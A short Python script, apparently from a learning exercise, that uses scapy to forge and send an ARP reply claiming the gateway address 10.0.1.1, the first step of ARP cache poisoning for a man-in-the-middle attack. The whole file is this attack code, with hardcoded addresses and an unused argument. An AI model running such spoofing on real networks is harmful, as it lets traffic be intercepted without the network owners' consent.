#!/usr/bin/env python3

import scapy.all as scapy

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="08:00:27:01:af:01", psrc="10.0.1.1") #op=2 creates response instead of request; pdst=IP; hwdst=MAC; psrc=source
    scapy.send(packet)
